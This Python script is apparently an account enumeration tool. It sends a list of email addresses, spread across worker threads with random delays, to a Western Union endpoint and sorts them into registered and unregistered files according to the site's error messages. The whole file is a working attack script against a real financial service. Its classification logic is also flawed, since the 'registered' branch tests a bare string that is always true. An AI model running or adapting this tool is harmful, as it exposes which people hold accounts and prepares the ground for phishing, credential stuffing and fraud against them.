import json
import queue
import urllib
import argparse
from threading import Thread, Lock, current_thread

from logger import log
from utils import random_delay
from random_requests import get_session_request, get_random_session_request


parser = argparse.ArgumentParser()
parser.add_argument('-n', '--number-workers', type=int, default=1, help="Number of workers to be used")
parser.add_argument('-i', '--headers_index', type=int, default=0, help="The index of the headers in parameters.txt")

args = parser.parse_args()

NUMBER_OF_WORKERS = args.number_workers
HEADERS_INDEX = args.headers_index

email_queue = queue.Queue()
lock = Lock()

def make_requests():
    global email_queue
    emails = open('data/emails.txt','r').readlines()
    emails_by_workers = int(len(emails) / NUMBER_OF_WORKERS) + bool(len(emails) % NUMBER_OF_WORKERS)

    # Distribute the emails equally between the workers
    for i in range(NUMBER_OF_WORKERS):
        start = i * emails_by_workers
        end = start + emails_by_workers
        email_queue.put(emails[start:end])

def request_www_westernunion_com(emails):
    # log.info("Emails for {}: {}".format(current_thread().name, ', '.join(emails)))
    req, session_id = get_session_request(HEADERS_INDEX)
    
    for email in emails:
        try:
            # Add some delay between requests
            # random_delay(1, 3)

            # req, session_id = get_random_session_request()
            
            body = json.dumps({
                'email': email,
                'security': {
                    'session': {
                        'id': session_id
                    },
                    'version': '2'
                },
                'bashPath': '/us/en'
            }).encode()


            random_delay(4, 6)

            response = urllib.request.urlopen(req, body)
            data = response.fp.read()
            if data:
                # Get the message from the response
                msg = json.loads(data.decode('utf-8'))['error']['message']

                # Email IS NOT registered
                if "We can't find that email address" in msg:
                    log.info('Not registered: {}'.format(email))
                    with open('data/not_registered_emails.txt', 'a') as fp:
                        fp.write(email)
                
                # Email IS registered
                elif "There's already an account with this email address":
                    log.info('Registered: {}'.format(email))
                    with open('data/registered_emails.txt', 'a') as fp:
                        fp.write(email)
                
                # Other message
                else:
                    log.info(msg)
                    with open('data/failed_emails.txt', 'a') as fp:
                        fp.write(email)
            
            # No data received in response
            else:
                log.info('Status: {}, Message: {}, Data: {}'.format(response.status, response.msg, data))

        except urllib.error.URLError as e:
            if not hasattr(e, "code"):
                return False
            raise e

        except Exception as e:
            raise e



def worker():
    while True:
        with lock:
            emails = email_queue.get()
        if emails is None:
            break
        request_www_westernunion_com(emails)
        # email_queue.task_done()
        # time.sleep(1)

threads = []
for i in range(NUMBER_OF_WORKERS):
    t = Thread(target=worker, name='worker {}'.format(i))
    t.start()
    threads.append(t)


make_requests()


# block until all tasks are done
# email_queue.join()

# Stop workers
for i in range(NUMBER_OF_WORKERS):
    email_queue.put(None)
for t in threads:
    t.join()









# def worker():
#     while True:
#         item = email_queue.get()
#         if item is None:
#             break
#         do_work(item)
#         email_queue.task_done()

# threads = []
# for i in range(NUMBER_OF_WORKERS):
#     t = threading.Thread(target=worker)
#     t.start()
#     threads.append(t)

# for item in source():
#     email_queue.put(item)

# # block until all tasks are done
# email_queue.join()

# # stop workers
# for i in range(NUMBER_OF_WORKERS):
#     email_queue.put(None)
# for t in threads:
#     t.join()